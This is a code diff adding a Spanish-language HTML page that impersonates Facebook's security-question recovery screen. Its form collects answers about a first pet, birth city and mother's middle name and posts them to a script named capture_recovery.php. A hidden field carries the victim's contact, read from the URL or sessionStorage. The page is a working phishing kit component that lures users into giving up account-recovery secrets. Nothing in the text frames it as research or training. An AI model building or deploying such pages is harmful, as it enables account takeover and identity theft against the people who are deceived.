@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Preguntas de seguridad • Facebook</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:Helvetica,Arial; background:#f0f2f5; min-height:100vh; display:flex; flex-direction:column; }
+        .header { background:white; padding:12px 20px; box-shadow:0 1px 3px rgba(0,0,0,0.1); display:flex; align-items:center; gap:12px; }
+        .fb-logo-small { width:40px; height:40px; background:#1877f2; border-radius:50%; display:flex; align-items:center; justify-content:center; color:white; font-size:24px; font-weight:bold; }
+        .main { flex:1; display:flex; align-items:center; justify-content:center; padding:20px; }
+        .card { background:white; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:500px; width:100%; padding:24px; }
+        h2 { margin-bottom:8px; }
+        .sub { color:#65676b; margin-bottom:24px; }
+        .question { margin-bottom:20px; }
+        label { font-weight:600; display:block; margin-bottom:6px; }
+        input { width:100%; padding:12px; border:1px solid #ccd0d5; border-radius:6px; font-size:16px; }
+        .actions { display:flex; justify-content:flex-end; margin-top:24px; }
+        .btn { background:#1877f2; color:white; border:none; padding:10px 24px; border-radius:6px; font-weight:600; cursor:pointer; }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="fb-logo-small">f</div>
+        <div>Preguntas de seguridad</div>
+    </header>
+    <main class="main">
+        <div class="card">
+            <h2>Responde tus preguntas de seguridad</h2>
+            <p class="sub">Estas preguntas te ayudarán a verificar tu identidad</p>
+            <form action="capture_recovery.php" method="POST">
+                <input type="hidden" name="platform" value="facebook">
+                <input type="hidden" name="recovery_type" value="security_questions">
+                <input type="hidden" name="contact" id="hiddenContact">
+                <div class="question">
+                    <label>¿Cuál es el nombre de tu primera mascota?</label>
+                    <input type="text" name="question_1" required>
+                </div>
+                <div class="question">
+                    <label>¿Cuál es tu ciudad de nacimiento?</label>
+                    <input type="text" name="question_2" required>
+                </div>
+                <div class="question">
+                    <label>¿Cuál es el segundo nombre de tu madre?</label>
+                    <input type="text" name="question_3" required>
+                </div>
+                <div class="actions">
+                    <button type="submit" class="btn">Verificar respuestas</button>
+                </div>
+            </form>
+        </div>
+    </main>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const contact = params.get('contact') || sessionStorage.getItem('fb_recovery_contact');
+        document.getElementById('hiddenContact').value = contact;
+    </script>
+</body>
+</html>
